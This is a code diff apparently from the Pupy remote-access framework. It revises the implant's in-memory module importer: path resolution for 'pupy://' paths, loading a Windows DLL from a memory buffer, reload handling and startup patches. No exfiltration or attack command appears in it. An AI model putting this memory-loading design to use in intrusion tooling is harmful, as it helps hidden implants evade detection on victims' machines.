@@ -71,8 +71,12 @@ for module in ('nt', 'posix'):
     if module in sys.builtin_module_names:
         os_ = __import__(module)
 
-if sys.version_info.major > 2:
+if sys.version_info.major < 3:
     xrange = range
+
+    __all__ = tuple(
+        export.encode('ascii') for export in __all__
+    )
 
 
 def _stub(*args, **kwargs):
@@ -163,6 +167,8 @@ ANY_INIT = tuple(
     '__init__' + ext for ext in EXTS_SOURCES + EXTS_COMPILED
 )
 
+MODULE_CLASS = sys.__class__
+
 __debug = False
 __debug_file = None
 __debug_pending = []
@@ -185,13 +191,15 @@ manager = None
 Task = None
 Manager = None
 
+_pywintypes = None
+
 aliases = {
     'Cryptodome': 'Crypto',
 }
 
 direct_load = {
-    'pywintypes': 'pywintypes27.dll',
-    'pythoncom': 'pythoncom27.dll'
+    # 'pywintypes': 'pywintypes27.dll',
+    # 'pythoncom': 'pythoncom27.dll'
 }
 
 
@@ -374,9 +382,28 @@ def load_dll(name, buf=None):
     return None
 
 
-def get_module_files(fullname):
+def _get_module_files(fullname, path=None):
     """ return the file to load """
-    path = fullname.replace('.', '/')
+
+    maybe_path = fullname.replace('.', '/')
+    if not path:
+        path = maybe_path
+    elif path.startswith('pupy://'):
+        path = path[7:]
+        if not maybe_path.startswith(path + '/'):
+            path += '/' + maybe_path
+        else:
+            path = maybe_path
+    else:
+        if not maybe_path.startswith(path + '/'):
+            path += '/' + maybe_path
+        else:
+            path = maybe_path
+
+    while '//' in path:
+        path = path.replace('//', '/')
+
+    dprint("Search in modules: " + path)
 
     files = [
         module for module in modules
@@ -388,6 +415,21 @@ def get_module_files(fullname):
     ]
 
     return files
+
+
+def get_module_files(fullname, paths=[None]):
+    dprint(
+        "get_module_files({}, {})".format(
+            repr(fullname), repr(paths)
+        )
+    )
+
+    for path in paths:
+        files = _get_module_files(fullname, path)
+        if files:
+            return files
+
+    return []
 
 
 def make_module(fullname, path=None, is_pkg=False, mod=None):
@@ -406,6 +448,13 @@ def make_module(fullname, path=None, is_pkg=False, mod=None):
         mod.__package__ = str(fullname)
     else:
         mod.__package__ = str(fullname.rsplit('.', 1)[0])
+
+    original_module = sys.modules.get(fullname)
+    if original_module:
+        # Looks like an reload
+        for (alias, module) in sys.modules.items():
+            if module is original_module:
+                sys.modules[alias] = mod
 
     sys.modules[fullname] = mod
     return mod
@@ -541,7 +590,7 @@ class PupyPackageFinderImportError(ImportError):
 
 
 class PupyPackageFinder(object):
-    __slots__ = ('path')
+    __slots__ = ('path', 'locals', 'globals')
 
     search_lock = None
     search_set = set()
@@ -551,6 +600,8 @@ class PupyPackageFinder(object):
             raise PupyPackageFinderImportError()
 
         self.path = path[7:].replace('\\', '/')
+        self.locals = locals()
+        self.globals = globals()
 
     @staticmethod
     def init_search_lock():
@@ -649,7 +700,7 @@ class PupyPackageFinder(object):
         if fullname in sys.modules:
             return DummyPackageLoader(fullname)
 
-        dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))
+        dprint('Find module: {}/{}'.format(fullname, second_pass))
 
         if not second_pass:
             imp.acquire_lock()
@@ -657,8 +708,11 @@ class PupyPackageFinder(object):
         selected = None
 
         try:
+            files = None
+
             if fullname in direct_load:
-                files = [direct_load[fullname]]
+                direct_load_name = direct_load[fullname]
+                files = get_module_files(direct_load_name)
             else:
                 files = get_module_files(fullname)
 
@@ -671,8 +725,11 @@ class PupyPackageFinder(object):
             if not files:
                 files = []
 
-                dprint('{} not found in {}: not in {} files'.format(
-                    fullname, files, len(files)))
+                dprint(
+                    '{} not found in {}: not in {} files'.format(
+                        fullname, files, len(files)
+                    )
+                )
 
                 return self._remote_load_packages(fullname, second_pass)
 
@@ -726,7 +783,7 @@ class PupyPackageFinder(object):
                 import traceback
                 traceback.print_exc(e)
 
-            raise e
+            raise
 
         finally:
             if selected and selected in modules:
@@ -743,12 +800,23 @@ class PupyPackageFinder(object):
 def initialize_basic_windows_modules():
     dprint('Initialize basic windows modules')
     try:
-        import pywintypes
-        assert pywintypes
-    except ImportError:
+        if 'pywintypes27.dll' in modules:
+            dprint('Load pywintypes')
+            load_dll('pywintypes27.dll', modules['pywintypes27.dll'])
+            del modules['pywintypes27.dll']
+
+            dprint('Load pywin32 loader')
+            import _win32sysloader  # noqa
+    except (NotImplementedError, WindowsError, ImportError) as e:
+        dprint("Failed to load pywin32 loader: " + str(e))
         # We will try to leave without them..
         # This may happen on default python27 install
         pass
+
+    from .winerror_hacks import apply_winerror_hacks
+
+    # Enable unicode descriptions for windows errors
+    apply_winerror_hacks()
 
 
 def load_pupyimporter(stdlib=None):
@@ -904,11 +972,13 @@ def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
 
     from .handlers import set_sighandlers
     from .ssl_hacks import apply_ssl_hacks
+    from .psutil_hacks import apply_psutil_hacks
 
     from network.conf import load_network_modules
 
     set_sighandlers()
     apply_ssl_hacks()
+    apply_psutil_hacks()
     load_memimporter_fallback()
     setup_credentials(config)
     setup_manager()
